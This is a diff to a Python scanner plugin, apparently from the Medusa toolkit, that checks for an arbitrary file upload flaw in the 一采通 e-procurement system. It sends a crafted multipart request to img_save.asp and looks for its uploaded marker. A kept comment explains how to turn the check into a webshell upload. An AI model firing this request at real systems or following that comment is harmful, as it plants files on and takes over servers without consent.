@@ -1,8 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-'''
-注意！只能对oracle数据库起作用
-'''
+
 __author__ = 'Ascotbe'
 __times__ = '2019/10/13 22:12 PM'
 import urllib.parse
@@ -42,6 +40,7 @@ def medusa(Url,RandomAgent,UnixTimestamp):
     else:
         port = port
     try:
+        RD=ClassCongregation.randoms().result(20)
         payload = "/library/editornew/Editor/img_save.asp"
         payload_url = scheme + "://" + url +":"+ str(port)+ payload
         data = '''
@@ -49,7 +48,7 @@ def medusa(Url,RandomAgent,UnixTimestamp):
 Content-Disposition: form-data; name="img_src"; filename="123.cer"
 Content-Type: application/x-x509-ca-cert
 
-testvul
+{}
 ------WebKitFormBoundaryNjZKAB66SVyL1INA
 Content-Disposition: form-data; name="Submit"
 
@@ -79,7 +78,7 @@ Content-Disposition: form-data; name="img_vspace"
 
 
 ------WebKitFormBoundaryNjZKAB66SVyL1INA--
-'''
+'''.format(RD)
         headers = {
             'User-Agent': RandomAgent,
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -96,7 +95,7 @@ Content-Disposition: form-data; name="img_vspace"
             con2 = resp2.text
             code2 = resp2.status_code
             #如果要上传shell直接把testvul这个值改为一句话就可以
-            if code2 == 200 and con2.lower().find("testvul") != -1:
+            if code2 == 200 and con2.lower().find(RD) != -1:
                 Medusa = "{}存在一采通电子采购系统任意文件上传漏洞\r\n 验证数据:\r\nshell地址:{}\r\n内容:{}\r\n".format(url,payload_url2,con2)
                 _t=VulnerabilityInfo(Medusa)
                 ClassCongregation.VulnerabilityDetails(_t.info, url,UnixTimestamp).Write()  # 传入url和扫描到的数据
